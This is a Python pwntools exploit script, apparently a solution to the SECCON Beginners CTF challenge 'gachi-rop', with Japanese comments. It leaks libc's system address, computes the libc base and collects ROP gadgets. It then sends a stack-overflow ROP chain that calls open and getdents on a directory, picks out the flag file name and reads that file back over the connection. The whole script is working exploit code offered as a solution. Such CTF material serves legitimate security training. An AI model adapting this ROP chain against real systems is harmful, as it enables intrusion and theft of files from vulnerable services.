from pwn import *
import re

elf = ELF('./gachi-rop')
libc = ELF('./libc.so.6')
# io = process(elf.path)
io = remote("gachi-rop.beginners.seccon.games", 4567)
context.binary = elf

io.recvuntil(b'system@')
system_addr = int(io.recvline().strip(), 16)
log.info(f'system address: {hex(system_addr)}')

libc.address = system_addr - libc.symbols['system']
log.info(f'libc base address: {hex(libc.address)}')

##gadget
POP_RDI_RET = p64(next(libc.search(asm('pop rdi; ret'), executable=True))) # pop rdi; ret;
POP_RAX_RET = p64(next(libc.search(asm('pop rax; ret'), executable=True))) # pop rax; ret;
POP_RSI_RET = p64(next(libc.search(asm('pop rsi; ret'), executable=True))) # pop rsi; ret;
POP_RSP_RET = p64(next(libc.search(asm('pop rsp; ret'), executable=True))) # pop rsp; ret;
SYSCALL = p64(next(libc.search(asm('syscall; ret'), executable=True))) # syscall; ret;
RET = p64(next(libc.search(asm('ret'), executable=True))) # ret;
POP_RDX_RBX_RET = p64(next(libc.search(asm('pop rdx; pop rbx; ret'), executable=True))) # pop rdx; pop rbx; ret;
MOV_RAX_2 = p64(next(libc.search(asm('mov rax, 2; ret'), executable=True))) # mov rax, 2; ret;
MOV_RAX_1 = p64(next(libc.search(asm('mov rax, 1; ret'), executable=True))) # mov rax, 1; ret;
XOR_RAX = p64(next(libc.search(asm('xor rax, rax; ret'), executable=True))) # xor rax, rax; ret;
LEAVE_RET = p64(next(libc.search(asm('leave; ret'), executable=True))) # leave; ret;

offset = 24
dirname = 0x4040e0
dirent = 0x404800
filename = 0x4040f0
flag = 0x404c00

input("wait")


## 1. ctf4b/をgetdentsしてwrite,flagの入っているファイル名を抜き出す
## 2. ファイルをorw

# 1.
info("leak file name")
# getsで検索するディレクトリ名を受け付ける
p = b'A' * 0x18
p += POP_RDI_RET
p += p64(dirname)
p += p64(libc.sym["gets"])
# open(dirname, 0, READ_ONLY=0)
p += POP_RDI_RET
p += p64(dirname)
p += POP_RSI_RET
p += p64(0)
p += POP_RAX_RET
p += p64(2)
p += SYSCALL
# getdents(3, dirent, 0x400)
p += POP_RDI_RET
p += p64(3)
p += POP_RSI_RET
p += p64(dirent)
p += POP_RDX_RBX_RET
p += p64(0x400)
p += p64(0)
p += POP_RAX_RET
p += p64(217)
p += SYSCALL
# write(1, dirent, 0x100)
p += POP_RDI_RET
p += p64(1)
p += POP_RSI_RET
p += p64(dirent)
p += POP_RDX_RBX_RET
p += p64(0x100)
p += p64(0)
p += p64(libc.sym["write"])
# 2.
# getsでFLAGのファイル名を受け付ける
p += POP_RDI_RET
p += p64(filename)
p += p64(libc.sym["gets"])
# open(filename, 0, READ_ONLY=0)
p += POP_RDI_RET
p += p64(filename)
p += POP_RSI_RET
p += p64(0)
p += POP_RAX_RET
p += p64(2)
p += SYSCALL
# read(4, flag, 0x100)
p += POP_RDI_RET
p += p64(4)
p += POP_RSI_RET
p += p64(flag)
p += POP_RDX_RBX_RET
p += p64(0x100)
p += p64(0)
p += p64(libc.sym["read"])
# write(1, flag, 0x100)
p += POP_RDI_RET
p += p64(1)
p += POP_RSI_RET
p += p64(flag)
p += POP_RDX_RBX_RET
p += p64(0x100)
p += p64(0)
p += p64(libc.sym["write"])

io.sendlineafter(b'Name: ', p)
io.recv()

## getsにディレクトリ名を入力
p = b"./ctf4b/"
io.sendline(p)

## file名を取得
r = io.recv(2048).decode('latin1')
pattern = r"flag[^ ]*\.txt"
filename = p.decode() + re.search(pattern, r).group()
info(f"filename: {filename}")

##  getsにfile名を入力
io.sendline(filename.encode())
info(io.recv().decode('latin1').replace("\x00", ""))